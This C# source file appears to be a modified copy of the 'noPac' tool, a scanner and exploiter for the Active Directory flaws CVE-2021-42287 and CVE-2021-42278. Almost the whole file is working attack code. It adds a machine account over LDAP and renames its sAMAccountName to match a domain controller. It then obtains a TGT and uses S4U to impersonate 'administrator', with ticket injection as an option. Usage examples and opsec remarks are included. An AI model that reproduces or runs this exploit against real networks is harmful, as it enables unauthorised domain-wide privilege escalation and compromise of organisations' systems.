using Rubeus;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.Protocols;
using System.Linq;
using System.Net;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;

namespace noPac
{
    public class Program
    {
        public static void Main(string[] args)
        {
            string argDomainUser = "";
            string argDomainUserPassword = "";

            string argContainer = "COMPUTERS";
            string argDistinguishedName = "";
            string argDomain = "";
            string argDomainController = "";
            string argTargetSPN = "";
            string argService = "LDAP";
            string argImpersonate = "administrator";
            bool argPTT = false;

            string argMachineAccount = "";
            string argMachinePassword = "";

            string argEncType = "";
            Interop.KERB_ETYPE EncType = Interop.KERB_ETYPE.subkey_keymaterial;

            bool argRandom = false;
            bool argVerbose = true;
            Rubeus.lib.Interop.LUID luid = new Rubeus.lib.Interop.LUID();

            if (args == null || !args.Any())
            {
                PrintHelp();
                return;
            }

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();

                switch (argument)
                {
                    case "-DOMAIN":
                    case "/DOMAIN":
                        argDomain = args[entry.index + 1];
                        break;

                    case "-USER":
                    case "/USER":
                        argDomainUser = args[entry.index + 1];
                        break;

                    case "-PASS":
                    case "/PASS":
                        argDomainUserPassword = args[entry.index + 1];
                        break;
                    case "-DC":
                    case "/DC":
                        argDomainController = args[entry.index + 1];
                        break;
                    case "-MACCOUNT":
                    case "/MACCOUNT":
                        argMachineAccount = args[entry.index + 1];
                        break;
                    case "-MPASSWORD":
                    case "/MPASSWORD":
                        argMachinePassword = args[entry.index + 1];
                        break;
                    case "-SERVICE":
                    case "/SERVICE":
                        argService = args[entry.index + 1];
                        break;
                    case "-IMPERSONATE":
                    case "/IMPERSONATE":
                        argImpersonate = args[entry.index + 1];
                        break;
                    case "-ENCTYPE":
                    case "/ENCTYPE":
                        argEncType = args[entry.index + 1];
                        break;
                    case "-PTT":
                    case "/PTT":
                        argPTT = true;
                        break;
                }
            }


            // encryption types
            EncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1; //default when no /ENCTYPE is specified

            string salt = String.Format("{0}{1}", argDomain.ToUpper(), argDomainUser);

            string argEncTypeString = argEncType.ToUpper();

            if (argEncTypeString.Equals("DES"))
            {
                EncType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (argEncTypeString.Equals("RC4"))
            {
                EncType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (argEncTypeString.Equals("AES128"))
            {
                EncType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (argEncTypeString.Equals("AES256"))
            {
                EncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            else
            {
                argEncTypeString = "AES256 (default when no /enctype is specified and for better opsec)";
            }

            Console.WriteLine("[+] Domain: {0}", argDomain);
            Console.WriteLine("[+] User account: {0}", argDomainUser);
            Console.WriteLine("[+] Encryption type: {0}", argEncTypeString);

            NetworkCredential credential = new NetworkCredential(argDomainUser, argDomainUserPassword, argDomain);
            string machineAccountPasswordHash = Crypto.KerberosPasswordHash(EncType, argMachinePassword);
            string domainUserPasswordHash = Crypto.KerberosPasswordHash(EncType, argDomainUserPassword, salt);

            if (args.Length >= 1)
            {
                if (args[0] == "scan")
                {
                    if(string.IsNullOrEmpty(argDomain) || string.IsNullOrEmpty(argDomainUser) || string.IsNullOrEmpty(argDomainUserPassword))
                    {
                        //Console.WriteLine("[-] /domain /user /pass argument needed for scanning");
                        PrintHelp();
                        return;
                    }

                    scan(argDomain, argDomainUser, argDomainUserPassword, domainUserPasswordHash, argDomainController, EncType);
                    return;
                }
                if (string.IsNullOrEmpty(argDomainController) || string.IsNullOrEmpty(argMachineAccount) || string.IsNullOrEmpty(argMachinePassword))
                {
                    //Console.WriteLine("[-] /dc /mAccount /mPassword argument needed for exploitation");
                    PrintHelp();
                    return;
                }

                argTargetSPN = $"{argService}/{argDomainController}";
                if(String.IsNullOrEmpty(argDomain))
                    argDomain = String.Join(".", argDomainController.Split('.').Skip(1).ToArray());
            }

            //new machine account
            try
            {
                NewMachineAccount(argContainer, argDistinguishedName, argDomain, argDomainController, argMachineAccount, argMachinePassword, argVerbose, argRandom, credential);
            } catch (DirectoryOperationException e)
            {
                //so we can rerun the tool using the same machine account or reuse machine account
                if (!e.Message.Contains("The object exists"))
                {
                    Console.WriteLine("[-] Failed to create machine account");
                    return;
                }
            }

            //clean spn
            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "serviceprincipalname", argMachineAccount, "", false, true, argVerbose, credential);

            //set samaccountname
            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argDomainController.Split('.')[0], false, false, argVerbose, credential);

            //ask tgt
            byte[] ticket = Ask.TGT(argDomainController.Split('.')[0], argDomain, machineAccountPasswordHash, EncType, "", false, argDomainController, luid, false, false, "", false, true);
            if (ticket.Length > 0)
            {
                Console.WriteLine("[+] Got TGT for {0}", argDomainController);
                //Console.WriteLine(Convert.ToBase64String(ticket));
            }
            else
            {
                Console.WriteLine("[-] Could not get TGT for {0}", argDomainController);
                return;
            }

            //undo samaccountname change
            SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argMachineAccount, false, false, argVerbose, credential);

            //s4u
            KRB_CRED kirbi = new KRB_CRED(ticket);
            S4U.Execute(kirbi, argImpersonate, "", "", argPTT, argDomainController, argTargetSPN, null, "", "", true, false, false, machineAccountPasswordHash, EncType, argDomain, "");
        }

        private static void PrintHelp()
        {
                Console.WriteLine();
                Console.WriteLine("CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter");
                Console.WriteLine("Author @Cube0x0");
                Console.WriteLine("Modified by Vibrio");
                Console.WriteLine();
                Console.WriteLine("/domain /user /pass argument needed for scanning");
                Console.WriteLine("/dc /mAccount /nPassword argument needed for exploitation");
                Console.WriteLine();
                Console.WriteLine("Examples:");
                Console.WriteLine("noPac.exe scan -domain htb.local -user domain_user -pass 'Password123!' /enctype aes128");
                Console.WriteLine("noPac.exe -dc dc02.htb.local -mAccount demo -mPassword 'Password123!' /enctype aes256");
                Console.WriteLine("noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo /mPassword Password123!");
                Console.WriteLine("noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc02.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt");
        }

        public static string GetMAQDistinguishedName(string node, string container, string distinguishedName, string domain, bool verbose)
        {
            string[] domainComponent;

            switch (container)
            {

                case "BUILTIN":
                    container = "CN=Builtin";
                    break;

                case "COMPUTERS":
                    container = "CN=Computers";
                    break;

                case "DOMAINCONTROLLERS":
                    container = "OU=Domain Controllers";
                    break;

                case "FOREIGNSECURITYPRINCIPALS":
                    container = "CN=ForeignSecurityPrincipals";
                    break;

                case "KEYS":
                    container = "CN=Keys";
                    break;

                case "LOSTANDFOUND":
                    container = "CN=LostAndFound";
                    break;

                case "MANAGEDSERVICEACCOUNTS":
                    container = "CN=Managed Service Accounts";
                    break;

                case "PROGRAMDATA":
                    container = "CN=Program Data";
                    break;

                case "USERS":
                    container = "CN=Users";
                    break;

                case "ROOT":
                    container = "";
                    break;

            }

            if (string.IsNullOrEmpty(distinguishedName))
            {

                if (!String.IsNullOrEmpty(container))
                {

                    if (!String.IsNullOrEmpty(node))
                    {
                        distinguishedName = String.Concat("CN=", node, ",", container);
                    }
                    else
                    {
                        distinguishedName = container;
                    }

                }

                domainComponent = domain.Split('.');

                foreach (string dc in domainComponent)
                {
                    distinguishedName += String.Concat(",DC=", dc);
                }

                distinguishedName = distinguishedName.TrimStart(',');

                if (verbose) { Console.WriteLine("[+] Distinguished Name = {0}", distinguishedName); };
            }
            else if (!String.IsNullOrEmpty(node))
            {
                distinguishedName = String.Concat("DC=", node, ",", distinguishedName);
            }

            return distinguishedName;
        }
        
        public static void NewMachineAccount(string container, string distinguishedName, string domain, string domainController, string machineAccount, string machinePassword, bool verbose, bool random, NetworkCredential credential)
        {
            string samAccountName;

            if (machineAccount.EndsWith("$"))
            {
                samAccountName = machineAccount;
                machineAccount = machineAccount.Substring(0, machineAccount.Length - 1);
            }
            else
            {
                samAccountName = String.Concat(machineAccount, "$");
            }

            byte[] unicodePwd;
            string randomPassword = "";

            if (random)
            {
                Console.WriteLine("[*] Generating random machine account password");
                RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
                byte[] randomBuffer = new byte[16];
                cryptoServiceProvider.GetBytes(randomBuffer);
                machinePassword = Convert.ToBase64String(randomBuffer);
            }

            domain = domain.ToLower();
            string dnsHostname = String.Concat(machineAccount, ".", domain);
            string[] servicePrincipalName = { String.Concat("HOST/", dnsHostname), String.Concat("RestrictedKrbHost/", dnsHostname), String.Concat("HOST/", machineAccount), String.Concat("RestrictedKrbHost/", machineAccount) };
            unicodePwd = Encoding.Unicode.GetBytes(String.Concat('"', machinePassword, '"'));
            distinguishedName = GetMAQDistinguishedName(machineAccount, container, distinguishedName, domain, verbose);
            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, 389);
            LdapConnection connection = new LdapConnection(identifier);

            if (!String.IsNullOrEmpty(credential.UserName))
            {
                connection = new LdapConnection(identifier, credential);
            }

            try
            {
                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                connection.Bind();
                AddRequest request = new AddRequest();
                request.DistinguishedName = distinguishedName;
                request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
                request.Attributes.Add(new DirectoryAttribute("sAMAccountName", samAccountName));
                request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
                request.Attributes.Add(new DirectoryAttribute("dNSHostName", dnsHostname));
                request.Attributes.Add(new DirectoryAttribute("servicePrincipalName", servicePrincipalName));
                request.Attributes.Add(new DirectoryAttribute("unicodePwd", unicodePwd));
                connection.SendRequest(request);
                connection.Dispose();

                if (random)
                {
                    Console.WriteLine("[+] Machine account {0} added with password {1}", machineAccount, randomPassword);
                }
                else
                {
                    Console.WriteLine("[+] Machine account {0} added", machineAccount);
                }

            }
            catch (Exception ex)
            {

                if (ex.Message.Contains("The object exists."))
                {
                    Console.WriteLine("[!] Machine account {0} already exists", machineAccount);
                }
                else if (ex.Message.Contains("The server cannot handle directory requests."))
                {
                    Console.WriteLine("[!] User may have reached ms-DS-MachineAccountQuota limit");
                }

                Console.WriteLine(ex.ToString());
                connection.Dispose();
                throw;
            }

        }

        public static void SetMachineAccountAttribute(string container, string distinguishedName, string domain, string domainController, string attribute, string machineAccount, string value, bool append, bool clear, bool verbose, NetworkCredential credential)
        {
            distinguishedName = GetMAQDistinguishedName(machineAccount, container, distinguishedName, domain, false);

            if (attribute.Equals("msDS-AllowedToActOnBehalfOfOtherIdentity"))
            {
                RawSecurityDescriptor rawSecurityDescriptor = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + value + ")");
                byte[] descriptor = new byte[rawSecurityDescriptor.BinaryLength];
                rawSecurityDescriptor.GetBinaryForm(descriptor, 0);
            }

            DirectoryEntry directoryEntry;

            if (!String.IsNullOrEmpty(credential.UserName))
            {
                directoryEntry = new DirectoryEntry(String.Concat("LDAP://", domainController, "/", distinguishedName), credential.UserName, credential.Password);
            }
            else
            {
                directoryEntry = new DirectoryEntry(String.Concat("LDAP://", domainController, "/", distinguishedName));
            }

            try
            {

                if (append)
                {
                    directoryEntry.Properties[attribute].Add(value);
                    directoryEntry.CommitChanges();
                    Console.WriteLine("[+] Machine account {0} attribute {1} appended", machineAccount, attribute);
                }
                else if (clear)
                {
                    directoryEntry.Properties[attribute].Clear();
                    directoryEntry.CommitChanges();
                    Console.WriteLine("[+] Machine account {0} attribute {1} cleared", machineAccount, attribute);
                }
                else
                {
                    directoryEntry.InvokeSet(attribute, value);
                    directoryEntry.CommitChanges();
                    Console.WriteLine("[+] Machine account {0} attribute {1} updated", machineAccount, attribute);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                throw;
            }

            if (!String.IsNullOrEmpty(directoryEntry.Path))
            {
                directoryEntry.Dispose();
            }

        }

        public static Dictionary<string, string> getDCs(string domain, string username, string password, string domainController)
        {
            Dictionary<string, string> list = new Dictionary<string, string>();
            string endpoint = "";
            if(string.IsNullOrEmpty(domainController))
            {
                endpoint = domain;
            }
            else
            {
                endpoint = domainController;
            }

            try {
                DirectoryEntry directoryEntry = new DirectoryEntry(String.Concat("LDAP://", endpoint), username, password);
                DirectorySearcher searcher = new DirectorySearcher(directoryEntry);
                searcher.Filter = "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))";
                searcher.PropertiesToLoad.AddRange(new string[] { "dnshostname", "Ipv4address" });
                foreach (SearchResult result in searcher.FindAll())
                {
                    DirectoryEntry entry = result.GetDirectoryEntry();
                    //Console.WriteLine("dnshostname: " + entry.Properties["dnshostname"].Value);
                    //Console.WriteLine("IPv4Address: " + entry.Properties["IPv4Address"].Value);
                    list.Add(entry.Properties["dnshostname"].Value.ToString(), "");
                }
            } catch {
                Console.WriteLine("[!] LDAP bind to {0} failed. User {1} or its password is incorrect/locked/expired", domain, username);
            }
            return list;
        }
        
        public static Dictionary<string, string> getDCs()
        {
            Dictionary<string, string> list = new Dictionary<string, string>();

            Domain domain = Domain.GetCurrentDomain();

            foreach (DomainController dc in domain.DomainControllers)
            {
                list.Add(dc.Name, dc.IPAddress);
            }
            return list;
        }

        public static void scan(string domain, string username, string password, string passwordHash, string domainController, Interop.KERB_ETYPE EncType)
        {
            Dictionary<string, string> DCs = new Dictionary<string, string>();
            DCs = getDCs(domain, username, password, domainController);
            //DCs = getDCs();

            foreach (var dc in DCs)
            {
                try
                {
                    Rubeus.lib.Interop.LUID luid = new Rubeus.lib.Interop.LUID();
                    byte[] ticket = Ask.TGT(username, domain, passwordHash, EncType, "", false, dc.Key, luid, false, false, "", false, false);
                    if (ticket.Length > 0)
                    {
                        Console.WriteLine("[+] Got TGT from {0}. Ticket size: {1}", dc.Key, ticket.Length);
                    }
                    else
                    {
                        Console.WriteLine("[-] Could not get TGT from {0}", dc.Key);
                        continue;
                    }
                }catch (Exception ex)
                {
                    Console.WriteLine("[-] Could not get TGT from {0}", dc.Key);
                    Console.WriteLine("[-] Exception {0}", ex);
                }
            }

        }
    }
}
